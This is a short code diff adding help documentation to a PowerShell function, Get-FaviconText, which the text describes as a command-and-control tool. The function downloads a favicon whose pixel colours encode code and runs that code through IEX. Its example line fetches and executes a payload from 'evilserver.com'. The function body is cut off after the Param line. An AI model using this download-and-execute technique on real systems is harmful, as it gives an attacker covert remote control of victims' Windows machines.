@@ -1,6 +1,36 @@
 function Get-FaviconText
 {
+    <#
+    .SYNOPSIS
+    Translate a favicon into executable code for c2 purposes
+    C2 Get-FaviconText
+    Author: Michael Scott (@_et0x)
+     
+    .DESCRIPTION
+    After creating a favicon using the python sister code in this repository, you serve it up as a 
+    vector for c2, to be read by this powershell script in a windows environment.  All the code in 
+    the icon is pushed into an IEX() statement for execution.
+     
+    .PARAMETER URL
+    The URL pointing to the favicon you wish to download.
+    .PARAMETER WriteTo
+    The location on your disk you wish to put the favicon after downloading.  This is a requirement
+    for loading the favicon / reading the pixels / translating the colors into code.
+    todo:  Add parameters for default locations favicons are saved on a per-browser basis.1
+
+    .EXAMPLE
+    C:\PS> Get-FaviconText -URL http://evilserver.com/favicon.ico -WriteTo $env:TEMP
+    Description
+    -----------
+    Download a favicon from evilserver.com, write it to your temp directory, and execute the code within.
     
+    .NOTES
+    Favicons must be encoded using the python sister code in the parent C2 repository.
+   
+    .LINK
+    http://www.rwnin.net
+    #>
+
     Param(
         
         [string]$URL,
